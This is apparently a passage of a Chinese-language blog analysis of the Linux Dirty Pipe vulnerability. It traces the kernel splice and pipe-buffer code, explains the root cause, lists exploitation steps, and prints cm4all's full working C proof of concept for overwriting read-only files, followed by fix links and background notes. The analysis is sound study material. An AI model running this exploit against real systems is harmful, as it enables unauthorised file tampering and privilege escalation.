class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 更新文件访问情况</span><br>        *ppos = kiocb.ki_pos;<br>        file_accessed(in);<br>    <span class="hljs-comment">// 如果数据传输失败</span><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        to.head = i_head;<br>        to.iov_offset = <span class="hljs-number">0</span>;<br>        iov_iter_advance(&amp;to, <span class="hljs-number">0</span>); <span class="hljs-comment">/* to free what was emitted */</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * callers of -&gt;splice_read() expect -EAGAIN on</span><br><span class="hljs-comment">         * &quot;can&#x27;t put anything in there&quot;, rather than -EFAULT.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (ret == -EFAULT)<br>            ret = -EAGAIN;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>从 <code>generic_file_splice_read</code> 函数的代码中可以看到，该函数最终会调用 <code>call_read_iter</code> 函数来做数据传递；而该函数又会调用特定于文件系统的 read_iter 函数：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">ssize_t</span> <span class="hljs-title">call_read_iter</span><span class="hljs-params">(struct file *file, struct kiocb *kio,</span></span><br><span class="hljs-params"><span class="hljs-function">                     struct iov_iter *iter)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> file-&gt;f_op-&gt;read_iter(kio, iter);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>从 <code>ext4_file_operations</code> 代码中可以得知，call_read_iter 函数调用到的是 ext4_file_read_iter 函数：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">ssize_t</span> <span class="hljs-title">ext4_file_read_iter</span><span class="hljs-params">(struct kiocb *iocb, struct iov_iter *to)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span> =</span> file_inode(iocb-&gt;ki_filp);<br>    <span class="hljs-comment">// 一些简单的判断</span><br>    <span class="hljs-keyword">if</span> (unlikely(ext4_forced_shutdown(EXT4_SB(inode-&gt;i_sb))))<br>        <span class="hljs-keyword">return</span> -EIO;<br><br>    <span class="hljs-keyword">if</span> (!iov_iter_count(to))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">/* skip atime */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_FS_DAX</span><br>    <span class="hljs-keyword">if</span> (IS_DAX(inode))<br>        <span class="hljs-keyword">return</span> ext4_dax_read_iter(iocb, to);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    <span class="hljs-keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_DIRECT)<br>        <span class="hljs-keyword">return</span> ext4_dio_read_iter(iocb, to);<br>    <span class="hljs-comment">// 没设置 O_DIRECT 的走这里</span><br>    <span class="hljs-keyword">return</span> generic_file_read_iter(iocb, to);<br>&#125;<br></code></pre></div></td></tr></table></figure><blockquote><p>What is <a href="https://cateee.net/lkddb/web-lkddb/FS_DAX.html">CONFIG_FS_DAX</a> – Direct Access (DAX) support found in <code>fs/Kconfig</code> </p></blockquote><p>然后该函数又调 <code>generic_file_read_iter</code>：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * generic_file_read_iter - generic filesystem read routine</span><br><span class="hljs-comment"> * @iocb:    kernel I/O control block</span><br><span class="hljs-comment"> * @iter:    destination for the data read</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This is the &quot;read_iter()&quot; routine for all filesystems</span><br><span class="hljs-comment"> * that can use the page cache directly.</span><br><span class="hljs-comment"> * Return:</span><br><span class="hljs-comment"> * * number of bytes copied, even for partial reads</span><br><span class="hljs-comment"> * * negative error code if nothing was read</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">ssize_t</span></span><br><span class="hljs-function"><span class="hljs-title">generic_file_read_iter</span><span class="hljs-params">(struct kiocb *iocb, struct iov_iter *iter)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">size_t</span> count = iov_iter_count(iter);<br>    <span class="hljs-keyword">ssize_t</span> retval = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (!count)<br>        <span class="hljs-keyword">goto</span> out; <span class="hljs-comment">/* skip atime */</span><br><br>    <span class="hljs-keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_DIRECT) &#123;<br>        ...<br>    &#125;<br>    <span class="hljs-comment">// 继续调用</span><br>    retval = generic_file_buffered_read(iocb, iter, retval);<br>out:<br>    <span class="hljs-keyword">return</span> retval;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>接着又调 <code>generic_file_buffered_read</code>函数。该函数代码量太大，只简单讲讲其大致功能：</p><ul><li>尝试在该文件已有的文件缓存映射表中查找先前已经映射的<strong>文件缓存</strong>页<ul><li>如果没文件缓存，则读取磁盘上的文件数据，创建新的文件缓存</li><li>如果有文件缓存但是缓存过期了，则更新这个文件缓存</li></ul></li><li>到了这一步，此时是一定有文件缓存了。则调用 <code>copy_page_to_iter</code> 函数来将文件缓存页上的数据，拷贝进 pipe 中。</li></ul><p>这个函数正是我们先前所介绍过的，因此整个 splice 系统调用，就可以和 pipe 那里的未初始化漏洞串起来了。</p><h3 id="四、漏洞成因"><a href="#四、漏洞成因" class="headerlink" title="四、漏洞成因"></a>四、漏洞成因</h3><p>这个漏洞并非一蹴而就，而是由两个 commit 的错误相互结合导致的：</p><ul><li><p><a href="https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b">new iov_iter flavour: pipe-backed - linux commit 241699</a>：引入字段的未初始化漏洞。 <code>push_pipe</code> 和 <code>copy_page_to_iter_pipe</code> 两个函数在设置 <code>pipe_buffer</code> 结构体时均未初始化 flag 字段。</p></li><li><p><a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">pipe: merge anon_pipe_buf*_ops - linux commit f6dd97</a>：在该 commit 前，内核通过比较 <code>pipe_buf-&gt;ops</code> 的地址来判断两块 <code>pipe_buf</code> 是否是<strong>可合并</strong>的。<strong>这种编码并不优雅</strong>，因为无论是否可合并，<code>pipe_buf-&gt;ops</code> 实际指向的几个函数指针都是同一个：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// fs/pipe.c</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> <span class="hljs-title">anon_pipe_buf_ops</span> =</span> &#123;<br>  .confirm = generic_pipe_buf_confirm,<br>  .release = anon_pipe_buf_release,<br>  .steal = anon_pipe_buf_steal,<br>  .get = generic_pipe_buf_get,<br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> <span class="hljs-title">anon_pipe_buf_nomerge_ops</span> =</span> &#123;<br>  .confirm = generic_pipe_buf_confirm,<br>  .release = anon_pipe_buf_release,<br>  .steal = anon_pipe_buf_steal,<br>  .get = generic_pipe_buf_get,<br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> <span class="hljs-title">packet_pipe_buf_ops</span> =</span> &#123;<br>  .confirm = generic_pipe_buf_confirm,<br>  .release = anon_pipe_buf_release,<br>  .steal = anon_pipe_buf_steal,<br>  .get = generic_pipe_buf_get,<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>可以看到，这么 tricky 的代码非常的不优雅，因此在该 commit(f6dd97) 中，linux 重构了这部分代码，启用了新的 pipe buf 标志：<code>PIPE_BUF_FLAG_CAN_MERGE</code>：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// include/linux/pipe_fs_i.h</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_LRU       0x01  <span class="hljs-comment">/* page is on the LRU */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_ATOMIC    0x02  <span class="hljs-comment">/* was atomically mapped */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_GIFT      0x04  <span class="hljs-comment">/* page is a gift */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_PACKET    0x08  <span class="hljs-comment">/* read() as a packet */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PIPE_BUF_FLAG_CAN_MERGE 0x10  <span class="hljs-comment">/* can merge buffers */</span>     <span class="hljs-comment">// &lt;= 新引入的 flag</span></span><br></code></pre></div></td></tr></table></figure><p>整个重构过程并没有问题，<strong>唯一带来的副作用就是引入了新的 pipe buf 标志：PIPE_BUF_FLAG_CAN_MERGE</strong>。</p></li></ul><p>尽管第一个 commit 引入了字段未初始化漏洞，但该漏洞仍然无法造成较大的影响，因为<strong>可选的几个 pipe buf flag 中没有什么是可以利用的</strong>。但是当第二个 commit 引入了新的 pipe buf flag：<code>PIPE_BUF_FLAG_CAN_MERGE</code> 时，因为新的 pipe_buf 可以通过未初始化漏洞，来重用旧的 flag，例如 <code>PIPE_BUF_FLAG_CAN_MERGE</code>，来<strong>打破 page buf 的完整性</strong>，使得<strong>允许对那些本不该写入的页进行写入</strong> (例如本不该带有 PIPE_BUF_FLAG_CAN_MERGE 标志的页，诸如文件缓存页等等)</p><p>注意，这里说的<strong>只读页</strong>，在 pipe 中<strong>并非使用权限控制等技术来保证不写</strong>，而是<strong>通过 pipe 所实现的逻辑来保证</strong>。因此，当 pipe 实现的逻辑出现了问题，那么 pipe 就可以尝试写入只读页，进而达到任意文件写的目的。</p><h3 id="五、漏洞利用"><a href="#五、漏洞利用" class="headerlink" title="五、漏洞利用"></a>五、漏洞利用</h3><blockquote><p><a href="https://tryhackme.com/room/dirtypipe">tryhackme</a> </p></blockquote><p>通过上面的代码分析我们可以简单推断出这样的一条漏洞利用链：</p><ol><li><p>创建管道（务必不要带上 O_DIRECT）</p></li><li><p>往管道中直接写入大量数据，使得 pipe 结构体中所有 page buf 的 flag 全部都设置了 PIPE_BUF_FLAG_CAN_MERGE 标志。</p></li><li><p>从该管道中将数据全部读取出来，释放所有 page buf。</p></li><li><p>调用 splice，将<strong>数据长度不与页大小对齐</strong>的<strong>可读</strong>文件数据，传递至该管道中。这样在管道的 head 位置，势必会有一个 page buf，其中 <strong>page 指向文件缓存</strong>，<strong>flags 为 PIPE_BUF_FLAG_CAN_MERGE</strong>。</p><blockquote><p>因为 page buf 在重分配时不会初始化 flags，因此这里的 flags 将仍然保留为 PIPE_BUF_FLAG_CAN_MERGE。</p></blockquote></li><li><p>直接继续往该管道中写入目标数据，这样由于 PIPE_BUF_FLAG_CAN_MERGE 标志仍然存在，新写入的数据将会直接与 page buf 所指向的文件缓存合并。</p></li><li><p>此时访问该文件，则内核会将被修改后的文件缓存中的数据返回，这样便可达到在内核层面任意文件写的目的。</p></li></ol><blockquote><p>需要注意的是，通过漏洞来“意外”修改文件缓存，<strong>不会使该文件缓存重新写回磁盘上</strong>。只有当内核的其他模块<strong>主动改写</strong>了这块文件缓存，使得该文件缓存<strong>变脏（dirty）</strong>，这样才会把被修改后的文件缓存保存回磁盘上。</p><p>内核判断一个文件缓存是否 dirty，并非判断上面的数据有无被改写，而是判断其 dirty 标志。通过 dirty pipe 漏洞来改写文件缓存并不会影响到上面的 dirty 标志。</p></blockquote><p>介于 cm4all 那边已经给出了非常清晰易懂的 POC，因此这里直接贴出它的 POC：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/user.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> PAGE_SIZE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PAGE_SIZE 4096</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span><br><span class="hljs-comment"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">prepare_pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span> p[<span class="hljs-number">2</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (pipe(p)) <span class="hljs-built_in">abort</span>();<br><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> pipe_size = fcntl(p[<span class="hljs-number">1</span>], F_GETPIPE_SZ);<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">4096</span>];<br><br>    <span class="hljs-comment">/* fill the pipe completely; each pipe_buffer will now have</span><br><span class="hljs-comment">       the PIPE_BUF_FLAG_CAN_MERGE flag */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br>        <span class="hljs-keyword">unsigned</span> n = r &gt; <span class="hljs-keyword">sizeof</span>(buffer) ? <span class="hljs-keyword">sizeof</span>(buffer) : r;<br>        write(p[<span class="hljs-number">1</span>], buffer, n);<br>        r -= n;<br>    &#125;<br><br>    <span class="hljs-comment">/* drain the pipe, freeing all pipe_buffer instances (but</span><br><span class="hljs-comment">       leaving the flags initialized) */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">unsigned</span> r = pipe_size; r &gt; <span class="hljs-number">0</span>;) &#123;<br>        <span class="hljs-keyword">unsigned</span> n = r &gt; <span class="hljs-keyword">sizeof</span>(buffer) ? <span class="hljs-keyword">sizeof</span>(buffer) : r;<br>        read(p[<span class="hljs-number">0</span>], buffer, n);<br>        r -= n;<br>    &#125;<br><br>    <span class="hljs-comment">/* the pipe is now empty, and if somebody adds a new</span><br><span class="hljs-comment">       pipe_buffer without initializing its &quot;flags&quot;, the buffer</span><br><span class="hljs-comment">       will be mergeable */</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">4</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Usage: %s TARGETFILE OFFSET DATA\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-comment">/* dumb command-line argument parser */</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> path = argv[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">loff_t</span> offset = strtoul(argv[<span class="hljs-number">2</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> data = argv[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">size_t</span> data_size = <span class="hljs-built_in">strlen</span>(data);<br><br>    <span class="hljs-keyword">if</span> (offset % PAGE_SIZE == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="hljs-number">1</span>)) + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">loff_t</span> end_offset = offset + (<span class="hljs-keyword">loff_t</span>)data_size;<br>    <span class="hljs-keyword">if</span> (end_offset &gt; next_page) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Sorry, cannot write across a page boundary\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-comment">/* open the input file and validate the specified offset */</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> fd = open(path, O_RDONLY); <span class="hljs-comment">// yes, read-only! :-)</span><br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>    <span class="hljs-keyword">if</span> (fstat(fd, &amp;st)) &#123;<br>        perror(<span class="hljs-string">&quot;stat failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (offset &gt; st.st_size) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Offset is not inside the file\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (end_offset &gt; st.st_size) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-comment">/* create the pipe with all flags initialized with</span><br><span class="hljs-comment">       PIPE_BUF_FLAG_CAN_MERGE */</span><br>    <span class="hljs-keyword">int</span> p[<span class="hljs-number">2</span>];<br>    prepare_pipe(p);<br><br>    <span class="hljs-comment">/* splice one byte from before the specified offset into the</span><br><span class="hljs-comment">       pipe; this will add a reference to the page cache, but</span><br><span class="hljs-comment">       since copy_page_to_iter_pipe() does not initialize the</span><br><span class="hljs-comment">       &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span><br>    --offset;<br>    <span class="hljs-keyword">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (nbytes &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;splice failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (nbytes == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;short splice\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-comment">/* the following write will not create a new pipe_buffer, but</span><br><span class="hljs-comment">       will instead write into the page cache, because of the</span><br><span class="hljs-comment">       PIPE_BUF_FLAG_CAN_MERGE flag */</span><br>    nbytes = write(p[<span class="hljs-number">1</span>], data, data_size);<br>    <span class="hljs-keyword">if</span> (nbytes &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;write failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">size_t</span>)nbytes &lt; data_size) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;short write\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> EXIT_FAILURE;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;It worked!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> EXIT_SUCCESS;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="六-漏洞修复"><a href="#六-漏洞修复" class="headerlink" title="六. 漏洞修复"></a>六. 漏洞修复</h3><p><a href="https://android-review.googlesource.com/c/kernel/common/+/1998671/1/lib/iov_iter.c">https://android-review.googlesource.com/c/kernel/common/+/1998671/1/lib/iov_iter.c</a></p><p><a href="https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/">https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/</a></p><h3 id="七-漏洞发现过程"><a href="#七-漏洞发现过程" class="headerlink" title="七. 漏洞发现过程"></a>七. 漏洞发现<a href="https://dirtypipe.cm4all.com/">过程</a></h3><ul><li>2021-04-29: first support ticket about file corruption</li><li>2022-02-19: file corruption problem identified as Linux kernel bug, which turned out to be an exploitable vulnerability</li></ul><p>漏洞的生命周期显然比较漫长.</p><p>背景:</p><ul><li><p>zip: <a href="https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html">The structure of a PKZip file</a> </p><ul><li><strong>End of central directory record (EOCD)</strong> 和 <strong>Central directory file header</strong> </li></ul><img src="../../image/dirtypipe/central-directory-structure.png" alt="Structure of the central directory" style="zoom: 80%;" /><ul><li>central dirctory header其实都是放在文件末尾, 这样便于添加新文件, 也可以把zip文件变成自我解压缩的zip文件, 只要在含有zip数据的可执行文件后加上header(?)</li><li>The ZIP format can hold collections of files without an external archiver, but is less compact than compressed <a href="https://en.wikipedia.org/wiki/Tar_(computing)">tarballs</a> holding the same data, because it compresses files individually and cannot take advantage of redundancy between files (<a href="https://en.wikipedia.org/wiki/Solid_compression">solid compression</a>).</li></ul><img src="../../image/dirtypipe/image-20221112212650539.png" alt="image-20221112212650539" style="zoom:67%;" /></li><li><p>zlib <a href="https://www.bolet.org/~pornin/deflate-flush.html">Sync Flush</a> </p><ul><li><p>The “sync flush” is what zlib implements when used with the <code>Z_SYNC_FLUSH</code> flag. It performs the following tasks:</p><ol><li>If there is some buffered but not yet compressed data, then this data is compressed into one or several blocks (the type for each block will depend on the amount and nature of data).</li><li>A new type 0 block with empty contents is appended.</li></ol><p>A type 0 block with empty contents consists of:</p><ul><li>the three-bit block header;</li><li>0 to 7 bits equal to zero, to achieve byte alignment;</li><li>the four-byte sequence <code>00 00 FF FF</code>.</li></ul></li></ul></li><li><p>sendfile是splice的一个子集, 现在的splice可以任意的传送, 两边的选择可以有pipe, socket, fd这些. sendfile在2.6.23已失效, 不过API接口仍然保存, 但是实际的函数已是<code>do_splice_direct</code>, 因为splice可以轻松地模拟sendfile. </p><ul><li>该函数会继续调用<code>splice_direct_to_actor </code> , This is a special case helper to splice directly between two points, <strong>without</strong> requiring an explicit pipe. <strong>Internally an allocated pipe</strong> is <strong>cached</strong> in the process, and reused during the lifetime of that process. pipe是作为中间人传递数据的, 以便于利用其他的splice函数. 反正pipe也是引用已有的page. </li></ul></li><li><p>iov_iter 和 